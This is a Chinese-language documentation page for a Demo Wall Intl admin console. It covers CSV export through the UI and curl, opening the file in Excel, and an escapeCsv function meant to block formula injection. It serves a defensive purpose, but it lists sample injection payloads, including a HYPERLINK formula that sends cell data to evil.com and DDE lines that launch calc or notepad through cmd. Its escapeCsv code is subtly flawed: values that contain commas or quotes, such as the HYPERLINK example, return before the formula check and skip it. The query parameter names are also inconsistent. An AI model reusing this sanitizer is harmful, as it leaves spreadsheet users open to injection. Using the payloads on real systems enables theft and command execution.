---
type: Example
title: CSV 数据导出示例
description: 演示管理员导出作品CSV的完整流程，包括选中导出、筛选导出、Excel打开验证、escapeCsv防注入原理。
tags: [demo-wall, intl, csv, export, excel, admin, example]
generated: { by: "reference_agent/trae-cn", at: 2026-04-22T00:00:00+08:00 }
verified: { by: "process:grep-verification", at: 2026-04-22T00:00:00+08:00 }
status: stable
stale_after: 2026-10-22
sources:
  - id: src
    resource: /references/demo-wall-intl-source.md
    title: Demo Wall Intl 源码信源索引
---

## 导出方式

CSV 导出是管理员功能，提供两种导出模式：

| 模式 | API 调用 | 说明 |
|------|---------|------|
| 全量/筛选导出 | `GET /api/console/works/export?status=approved&category=frontend` | 按筛选条件导出 |
| 选中导出 | `GET /api/console/works/export?ids=1,2,3,5,8` | 导出指定ID的作品 |

## 方式一：通过管理后台界面导出

1. 登录管理员账号
2. 进入管理后台 → 作品管理 `/en-US/console/works`
3. 根据需要设置筛选条件（审核状态、分类、荣誉、国家、城市、关键词）
4. 点击 **"Export CSV"** 按钮
   - 不勾选任何作品：按当前筛选条件导出（最多5000条）
   - 勾选特定作品：仅导出选中的作品
5. 浏览器自动下载 `works_export_YYYYMMDD_HHMMSS.csv`

## 方式二：通过 API 直接调用

### 全量导出

```bash
curl -X GET "https://your-domain.vercel.app/api/console/works/export" \
  -H "Cookie: next-auth.session-token=your-admin-session-token" \
  -o works_export.csv
```

### 按筛选条件导出

```bash
# 导出所有已通过的前端分类作品
curl -X GET "https://your-domain.vercel.app/api/console/works/export?auditStatus=approved&category=frontend" \
  -H "Cookie: next-auth.session-token=your-admin-session-token" \
  -o frontend_works.csv

# 导出来自印尼的作品
curl -X GET "https://your-domain.vercel.app/api/console/works/export?country=ID" \
  -H "Cookie: next-auth.session-token=your-admin-session-token" \
  -o indonesia_works.csv
```

### 选中导出

```bash
# 导出ID为 1、2、3、5、8 的作品
curl -X GET "https://your-domain.vercel.app/api/console/works/export?ids=1,2,3,5,8" \
  -H "Cookie: next-auth.session-token=your-admin-session-token" \
  -o selected_works.csv
```

## Excel 打开验证

### Windows Excel

1. 双击下载的 CSV 文件，Excel 应直接正确打开
2. 验证中文/日文/印尼文/越南文字符正确显示（无乱码）
3. 验证列对齐正确（无错位）

如果出现乱码：
- 不要直接双击打开，而是通过 Excel 的 **数据 → 从文本/CSV** 导入
- 文件编码选择 **65001: Unicode (UTF-8)**

UTF-8 BOM（`\uFEFF`）的存在就是为了让 Windows Excel 自动识别 UTF-8 编码。

### Mac Excel / Google Sheets

直接打开即可，BOM 不影响这些应用。

## CSV 内容示例

导出的 CSV 格式如下：

```csv
ID,Title,Description,Category,Honor,Country,City,Author,AuditStatus,DisplayStatus,Views,Likes,CreatedAt,UpdatedAt
1,"AI Chatbot Demo","A conversational AI chatbot built with GPT-4","AI Agent","Gold","United States","San Francisco","john_doe","Approved","Visible",1250,89,"2026-03-15T10:30:00Z","2026-04-20T14:22:00Z"
2,"ポートフォリオサイト","Next.jsで構築した個人ポートフォリオ","Frontend","Silver","Japan","Tokyo","tanaka","Approved","Visible",830,45,"2026-03-18T08:15:00Z","2026-04-19T09:10:00Z"
3,"Ứng dụng thời tiết","Weather app sử dụng React Native","Mobile","Bronze","Vietnam","Ho Chi Minh City","nguyen","Approved","Visible",420,23,"2026-04-01T11:45:00Z","2026-04-21T16:30:00Z"
```

## escapeCsv 安全机制详解

### 为什么需要转义

CSV 格式中三个字符有特殊含义：
- **逗号 (`,`)**：字段分隔符
- **双引号 (`"`)**：文本限定符
- **换行符 (`\n`, `\r`)**：记录分隔符

如果字段值包含这些字符而不转义，会导致列错位。

### 公式注入防护

更严重的安全风险是 **CSV 注入（Formula Injection）**：

Excel/Google Sheets 会将以 `=`、`+`、`-`、`@` 开头的单元格内容解释为公式：

```
=HYPERLINK("http://evil.com/steal?data="&A1,"Click here")
+cmd|' /C calc'!A0
-2+3+cmd|' /C notepad'!'A1'
@SUM(1+1)*cmd|' /C calc'!A0
```

恶意用户可以在作品标题中注入公式，当管理员导出 CSV 并用 Excel 打开时：
- 执行任意系统命令
- 窃取数据发送到恶意服务器
- 传播恶意软件

### escapeCsv 实现

```typescript
function escapeCsv(value: unknown): string {
  const str = String(value ?? '');

  // 1. 双引号转双写（CSV 标准转义）
  const escaped = str.replace(/"/g, '""');

  // 2. 包含特殊字符时用双引号包裹
  if (/[",\n\r]/.test(escaped)) {
    return `"${escaped}"`;
  }

  // 3. 防公式注入：以 =+,-@ 开头时前置单引号
  if (/^[=+\-@]/.test(escaped)) {
    return `'${escaped}`;
  }

  return escaped;
}
```

### 转义示例

| 原始值 | 转义后 | 原因 |
|--------|--------|------|
| `Hello World` | `Hello World` | 无特殊字符，直接输出 |
| `Hello, World` | `"Hello, World"` | 包含逗号，双引号包裹 |
| `Say "Hello"` | `"Say ""Hello"""` | 双引号双写+包裹 |
| `Line1\nLine2` | `"Line1\nLine2"` | 包含换行，包裹 |
| `=1+1` | `'=1+1` | 公式注入防护，前置单引号 |
| `+cmd|'/C calc` | `'+cmd|'/C calc` | 公式注入防护 |
| `-2+2` | `'-2+2` | 公式注入防护 |
| `@SUM(A1)` | `'@SUM(A1)` | 公式注入防护 |
| `正常标题` | `正常标题` | 中文无特殊字符 |

## 5000 条上限保护

```typescript
const MAX_EXPORT = 5000;

// 查询前先检查总数
const totalCount = await prisma.workBase.count({ where });
if (totalCount > MAX_EXPORT) {
  // 返回错误提示，或截取前5000条
  return NextResponse.json(
    { error: `Too many records (${totalCount}). Maximum is ${MAX_EXPORT}.` },
    { status: 400 }
  );
}
```

## 导出文件名生成

```typescript
const timestamp = new Date().toISOString()
  .replace(/[-:T]/g, '')
  .slice(0, 14);  // 20260422143052
const filename = `works_export_${timestamp}.csv`;
// → works_export_20260422143052.csv

return new Response(csvContent, {
  headers: {
    'Content-Type': 'text/csv; charset=utf-8',
    'Content-Disposition': `attachment; filename="${filename}"`,
  },
});
```

## 扩展：其他 CSV 导出模式

如果需要导出更大数据集（超过5000条），建议改为异步导出模式：

```typescript
// 异步导出流程
// 1. 请求导出 → 返回任务ID
// 2. 后台任务分批查询数据 → 生成CSV → 上传到COS
// 3. 完成后通知用户，提供下载链接

async function createExportJob(filters: ExportFilters) {
  const job = await prisma.exportJob.create({
    data: {
      status: 'pending',
      filters: JSON.stringify(filters),
      createdBy: session.user.id,
    }
  });

  // 触发异步处理（不等待完成）
  processExportJob(job.id).catch(console.error);

  return { jobId: job.id };
}
```

## 相关内容

- [CSV导出功能](/concepts/03-csv-export.md)
- [Demo Wall Intl 简介](/concepts/00-introduction.md)
